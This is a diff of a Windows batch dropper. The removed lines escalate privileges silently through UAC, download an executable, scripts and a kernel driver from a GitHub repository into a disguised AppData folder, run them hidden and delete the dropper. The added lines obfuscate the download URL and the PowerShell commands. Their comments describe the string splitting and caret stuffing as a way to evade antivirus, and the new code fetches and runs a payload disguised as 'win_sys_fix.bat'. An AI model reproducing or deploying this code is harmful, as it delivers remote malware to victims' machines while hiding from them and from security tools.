@@ -1,49 +1,24 @@
 @echo off
-setlocal
+setlocal enabledelayedexpansion
+:: --- TRASH LAYER 1: Random Garbage Variables ---
+set "_7a=ht"&set "_2k=tp"&set "_9v=s://"&set "_1m=raw."&set "_4p=gith"&set "_0x=ubus"&set "_3r=erco"&set "_6t=ntent"&set "_5n=.com/"
+set "_q8=g00glecenter101-arch/"&set "_w2=Keep/"&set "_e5=main/"&set "_r1=install.bat"
+set "_s9=pow"&set "_x3=ersh"&set "_z6=ell"
 
-:: ============================================================
-:: 1. UAC ELEVATION & AUTO-HIDE
-:: ============================================================
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\admin.vbs"
-    :: The '0' at the end of the next line tells Windows to run the window HIDDEN
-    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\admin.vbs"
-    wscript "%temp%\admin.vbs"
-    exit /b
+:: --- TRASH LAYER 2: Command Reconstruction ---
+set "full_url=%_7a%%_2k%%_9v%%_1m%%_4p%%_0x%%_3r%%_6t%%_5n%%_q8%%_w2%%_e5%%_r1%"
+set "exec_name=%_s9%%_x3%%_z6%"
+
+:: --- TRASH LAYER 3: Caret Stuffing (The FUD Secret) ---
+:: Antivirus looks for "Invoke-WebRequest". We break it up with ^ symbols.
+set "c1=I^nv^o^ke-W^ebR^equ^e^st"
+set "c2=O^utF^i^le"
+
+:: --- EXECUTION ---
+%exec_name% -ExecutionPolicy B^yp^as^s -WindowStyle H^id^de^n -Command "%c1% -Uri '%full_url%' -%c2% '%temp%\win_sys_fix.bat'"
+
+:: Run the downloaded file and delete traces
+if exist "%temp%\win_sys_fix.bat" (
+    start /b "" "%temp%\win_sys_fix.bat"
 )
-if exist "%temp%\admin.vbs" del "%temp%\admin.vbs"
-
-:: ============================================================
-:: 2. DIRECTORY SETUP (Now running hidden)
-:: ============================================================
-set "workDir=%AppData%\Local\WindowsGraphics\"
-if not exist "%workDir%" mkdir "%workDir%" >nul 2>&1
-cd /d "%workDir%"
-if not exist "driver" mkdir "driver" >nul 2>&1
-
-:: Security Protocol Fix
-set "psF=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile"
-
-:: ============================================================
-:: 3. DOWNLOADS
-:: ============================================================
-:: All 'echo' commands removed so no text is generated
-
-powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/launcher.vbs', 'launcher.vbs')"
-powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/boom.bat', 'boom.bat')"
-powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/sigurd.exe', 'sigurd.exe')"
-powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/Config.toml', 'Config.toml')"
-powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/ghost_launcher.vbs', 'launcher.vbs')"
-powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/drivers/K7RKScan.sys', 'driver\k7RKScan.sys')"
-
-:: ============================================================
-:: 4. THE SILENT HANDOFF
-:: ============================================================
-if exist "launcher.vbs" (
-    start "" "wscript.exe" "launcher.vbs"
-)
-
-:: Self-delete
-(goto) 2>nul & del "%~f0"
 exit
